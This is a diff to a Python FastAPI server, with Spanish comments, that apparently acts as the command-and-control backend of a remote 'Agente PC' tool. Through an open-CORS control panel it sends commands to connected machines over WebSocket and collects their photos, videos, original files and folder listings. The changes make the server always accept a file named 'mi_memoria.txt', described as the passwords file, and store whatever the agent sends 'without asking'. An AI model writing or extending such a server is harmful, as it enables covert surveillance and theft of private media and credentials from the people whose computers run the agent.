@@ -6,8 +6,9 @@ from pydantic import BaseModel
 from typing import List, Dict, Any
 from urllib.parse import unquote
 
-app = FastAPI(title="Agente PC - Servidor Central Pro")
+app = FastAPI(title="Servidor Universal para Agente PC")
 
+# Configuración de CORS para que el Panel de Control no tenga bloqueos
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -16,30 +17,30 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# --- "BASE DE DATOS" EN MEMORIA ---
+# --- BASES DE DATOS EN MEMORIA ---
 connected_agents: Dict[str, Dict[str, Any]] = {}
 device_media_cache: Dict[str, Dict[str, Any]] = {}
 fetch_status: Dict[str, str] = {}
 directory_cache: Dict[str, Dict[str, Any]] = {}
 file_content_cache: Dict[str, str] = {}
 
-# --- MODELOS DE DATOS ---
+# --- MODELOS ---
 class Command(BaseModel):
     target_id: str
     action: str
     payload: str = ""
 
-# --- ENDPOINTS ---
+# --- ENDPOINTS PRINCIPALES ---
 
 @app.get("/")
 async def root():
-    return {"status": "online", "message": "Servidor Universal Activo"}
+    return {"status": "online", "message": "Servidor listo para recibir al Agente"}
 
 @app.websocket("/ws/{device_id}/{device_name:path}")
 async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
     await websocket.accept()
     name = unquote(device_name)
-    print(f"[CONEXIÓN] Agente PC conectado: {name}")
+    print(f"Agente conectado: {name}")
     connected_agents[device_id] = {"ws": websocket, "name": name}
     try:
         while True:
@@ -47,6 +48,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: 
     except WebSocketDisconnect:
         if device_id in connected_agents: del connected_agents[device_id]
 
+# Esta es la ruta que daba error 404 en tu panel
 @app.get("/api/get-agents")
 async def get_agents():
     return [{"id": d_id, "name": data["name"]} for d_id, data in connected_agents.items()]
@@ -54,22 +56,24 @@ async def get_agents():
 @app.post("/api/send-command")
 async def send_command_to_agent(command: Command):
     agent = connected_agents.get(command.target_id)
-    if not agent:
-        return {"status": "error", "message": "Agente no conectado"}
+    if not agent: return {"status": "error", "message": "Agente desconectado"}
+    
+    # Limpiar caché si vamos a escanear de nuevo
     if command.action == "get_thumbnails":
         device_media_cache[command.target_id] = {}
         fetch_status[command.target_id] = "loading"
+        
     try:
         await agent["ws"].send_text(command.json())
         return {"status": "success"}
     except Exception as e:
         return {"status": "error", "message": str(e)}
 
-# --- MANEJO DE MEDIOS (FOTOS/VIDEOS) - AHORA FLEXIBLE ---
+# --- RECEPCIÓN DE DATOS (FOTOS, VIDEOS, RUTAS) ---
 
 @app.post("/api/submit_media_chunk/{device_id}")
 async def submit_media_chunk(device_id: str, payload: dict):
-    """Usamos 'dict' en lugar de un modelo rígido para evitar el error 422."""
+    """Esta ruta es flexible para que el agente no falle al enviar datos extra como filepath"""
     if device_id not in device_media_cache:
         device_media_cache[device_id] = {}
     
@@ -77,7 +81,7 @@ async def submit_media_chunk(device_id: str, payload: dict):
     for thumb in thumbnails:
         filename = thumb.get("filename")
         if filename:
-            # Guardamos todo lo que envíe el agente (incluyendo filepath si existe)
+            # Guardamos todo lo que envíe el agente sin preguntar
             device_media_cache[device_id][filename] = thumb
     
     if payload.get("is_final_chunk"):
@@ -92,18 +96,16 @@ async def get_media_list(device_id: str):
         "thumbnails": device_media_cache.get(device_id, {})
     }
 
+# --- VISUALIZACIÓN MAXIMIZADA Y CLAVES ---
+
 @app.post("/api/upload_original_file/{device_id}/{filename:path}")
 async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
     name = unquote(filename)
+    if device_id not in device_media_cache: device_media_cache[device_id] = {}
     
-    # EXCEPCIÓN PARA CLAVES: Creamos espacio si no existe
-    if name == "mi_memoria.txt":
-        if device_id not in device_media_cache: device_media_cache[device_id] = {}
-        if name not in device_media_cache[device_id]:
-            device_media_cache[device_id][name] = {"filename": name}
-    
-    if device_id not in device_media_cache or name not in device_media_cache[device_id]:
-        return Response(content='{"detail":"No solicitado"}', status_code=400)
+    # Excepción para que siempre acepte el archivo de claves
+    if name == "mi_memoria.txt" or name not in device_media_cache[device_id]:
+        device_media_cache[device_id][name] = {"filename": name}
     
     file_bytes = await file.read()
     device_media_cache[device_id][name]['original_b64'] = base64.b64encode(file_bytes).decode('utf-8')
@@ -115,21 +117,21 @@ async def get_large_media(device_id: str, filename: str):
     item = device_media_cache.get(device_id, {}).get(name)
     
     if not item or 'original_b64' not in item:
-        return Response(content='{"detail":"No disponible"}', status_code=404)
+        return Response(content='{"detail":"Archivo no listo"}', status_code=404)
     
     file_bytes = base64.b64decode(item['original_b64'])
-    fn_lower = name.lower()
+    fn = name.lower()
     
-    # Lógica inteligente de tipos para el navegador
-    if fn_lower.endswith(('.jpg', '.jpeg')): m_type = "image/jpeg"
-    elif fn_lower.endswith('.png'): m_type = "image/png"
-    elif fn_lower.endswith(('.mp4', '.mkv', '.avi', '.mov')): m_type = "video/mp4"
-    elif fn_lower.endswith(('.txt', '.dat')): m_type = "text/plain; charset=utf-8"
+    # Determinar tipo de archivo para el navegador
+    if fn.endswith(('.jpg', '.jpeg')): m_type = "image/jpeg"
+    elif fn.endswith('.png'): m_type = "image/png"
+    elif fn.endswith(('.mp4', '.mkv', '.avi', '.mov')): m_type = "video/mp4"
+    elif fn.endswith(('.txt', '.dat')): m_type = "text/plain; charset=utf-8"
     else: m_type = "application/octet-stream"
     
     return Response(content=file_bytes, media_type=m_type)
 
-# --- MANEJO DE EXPLORADOR ---
+# --- EXPLORADOR DE CARPETAS ---
 
 @app.post("/api/submit_directory_listing/{device_id}")
 async def submit_directory_listing(device_id: str, listing: dict):
